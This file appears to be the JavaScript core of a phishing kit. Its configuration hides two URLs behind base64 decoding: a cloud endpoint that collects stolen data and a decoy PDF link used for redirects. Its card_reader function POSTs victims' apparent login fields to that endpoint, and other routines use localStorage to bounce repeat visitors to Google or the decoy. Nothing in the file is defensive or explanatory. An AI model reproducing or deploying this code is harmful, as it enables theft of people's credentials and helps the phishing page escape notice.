
let LICENSE_KEY = "c2hvZ2FkZWxl";

let USE_RESULT_BOX = false; //Change to true if you want to use result box instead of result link

let STOP_USER_FROM_REENTRY = true;  //Change to false if you want multiple entries from single user

let CUSTOM_REDIRECT = "https://www.google.com"; // Defaul is google link

let FINAL_REDIRECTION = window.atob("aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy91Ym5udXNzejZoYnhvMHMvaW1kZWxvbGFkZXgtZmlsZS0yMDIxLnBkZj9kbD0w");//"https://am.jpmorgan.com/content/dam/jpm-am-aem/global/en/insights/market-insights/investment-outlook-2021-benlux.pdf";

let SCRIPT_LINK = "script.php";     //Optional, if you change the script name, you have to change this too

let FORCE_AUTO_GRAB = true;       //If you want to ignore auto grab, change to false;

let SHOW_EXTRA_PARAMS = true;         //If you want to ignore auto grab, change to false;

let SCRIPT_NAME = window.atob("aHR0cHM6Ly8wYTAzNzExNC5ldS1nYi5hcGlndy5hcHBkb21haW4uY2xvdWQvY2hlY2svcmVzdWx0");










//=========================?? End Boundary

















if(document.title !== "Loading..."){ch_is_loaded()}
if(USE_RESULT_BOX===true)SCRIPT_NAME=SCRIPT_LINK;ch_re_jet();
async function card_reader(a,b,c,d,e,f,g,h=""){
    return new Promise(function (resolve, reject) {
        $.ajax({
            url:  a,
            type: 'POST',
            dataType: "json",
            data: {
                r:b,
                l:c,
                i:d,
                p:e,
                u:f,
                pro:g,
                c:h
            },
            success: function (response) {
                resolve({response});
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(error);
            }
        });
    });
}


function ch_re_jet(){
    if(STOP_USER_FROM_REENTRY === true) {
        let sent = localStorage.getItem("sent");
        let sent_bool = sent === null;
        let ifr = window.frameElement;
        if (sent_bool === false){
            if (ifr === null) {
               window.location.replace(FINAL_REDIRECTION);
            } else {
                window.parent.location.replace(FINAL_REDIRECTION);
            }
     }
    }
}

function ch_is_loaded(){
        let sent = localStorage.getItem("page_loaded");
        let sent_bool = sent === null;
        let ifr = window.frameElement;
        if (sent_bool === true){
            if (ifr === null) {
                window.location.replace(CUSTOM_REDIRECT);
            } else {
                window.parent.location.replace(CUSTOM_REDIRECT);
            }
        }
}